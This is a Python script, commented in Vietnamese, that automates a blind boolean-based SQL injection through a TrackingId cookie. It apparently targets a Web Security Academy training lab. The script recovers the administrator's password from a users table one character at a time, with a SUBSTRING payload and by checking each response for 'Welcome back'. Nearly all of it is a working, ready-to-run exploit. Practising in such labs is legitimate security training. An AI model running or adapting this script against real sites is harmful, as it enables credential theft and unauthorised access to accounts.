#!/usr/bin/env python3
"""
Blind boolean-based SQLi bruteforce: thử từng ký tự trong SUBSTRING(..., pos, 1)
Charset: 0-9, a-z, A-Z
Dừng khi không tìm thấy ký tự nào ở một vị trí (giả sử đã tới cuối password).
"""

import requests
import time
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ------- CẤU HÌNH -------
URL = "https://0a660045048aa0808035d0d7002a000a.web-security-academy.net/login"
# Giữ phần TrackingId gốc (prefix) trước dấu đóng nháy, nếu khác thì thay thế prefix này
TRACKINGID_PREFIX = "tg0tY0lWPulZo2jZ"
SESSION_COOKIE = "u1ORkDddUiErW2xG1K1UpFbF92y4V0U6"  # thay bằng session thực tế nếu cần
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
    "Referer": "https://0a660045048aa0808035d0d7002a000a.web-security-academy.net/filter?category=Gifts"
}
# Thử các ký tự theo thứ tự: digits, lowercase, uppercase
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
# Khoảng dừng giữa các request (giảm rủi ro bị block). Điều chỉnh theo lab.
SLEEP_BETWEEN_REQUESTS = 0.1
# Nếu muốn bắn qua proxy (Burp), enable và sửa proxy URL
USE_PROXY = False
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
# Retry config
RETRIES = 3
TIMEOUT = 10  # seconds
# Giới hạn tối đa vị trí (bảo vệ vòng lặp vô hạn). Nếu None => không giới hạn (dừng khi không tìm thấy char).
MAX_LEN = 50
# ------- END CẤU HÌNH -------

# tạo session với retry
session = requests.Session()
retries = Retry(total=RETRIES, backoff_factor=0.3, status_forcelist=[429,500,502,503,504])
session.mount("https://", HTTPAdapter(max_retries=retries))
if USE_PROXY:
    session.proxies.update(PROXIES)
    session.verify = False  # nếu dùng Burp, tắt verify (chỉ lab)

def test_char(pos: int, ch: str) -> bool:
    """
    Trả về True nếu payload với ký tự ch ở vị trí pos kích hoạt phản hồi "Welcome back".
    """
    # chú ý cấu trúc: đóng nháy, AND điều kiện, comment (-- ) để bỏ phần phía sau
    payload = f"{TRACKINGID_PREFIX}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {pos}, 1) = '{ch}'-- "
    cookies = {
        "TrackingId": payload,
        "session": SESSION_COOKIE
    }
    try:
        r = session.get(URL, headers=HEADERS, cookies=cookies, timeout=TIMEOUT)
    except Exception as e:
        print(f"[!] Request error (pos={pos}, ch='{ch}'): {e}")
        return False

    # Kiểm tra theo nội dung trang. Dựa vào lab: "Welcome back" xuất hiện khi điều kiện True.
    return "Welcome back" in r.text

def brute_password():
    password = ""
    pos = 1
    while True:
        if MAX_LEN and pos > MAX_LEN:
            print("[*] Đạt giới hạn MAX_LEN. Dừng.")
            break

        found = False
        for ch in CHARSET:
            ok = test_char(pos, ch)
            print(f"pos={pos} trying '{ch}' -> {'FOUND' if ok else 'no'}")
            if ok:
                password += ch
                print(f"[+] vị trí {pos} = '{ch}'  => password so far: {password}")
                found = True
                break
            time.sleep(SLEEP_BETWEEN_REQUESTS)

        if not found:
            print(f"[-] Không tìm thấy ký tự hợp lệ ở vị trí {pos}. Kết luận: kết thúc password.")
            break

        pos += 1

    return password

if __name__ == "__main__":
    print("[*] Bắt đầu bruteforce...")
    pw = brute_password()
    print(f"[RESULT] Administrator password: '{pw}'")

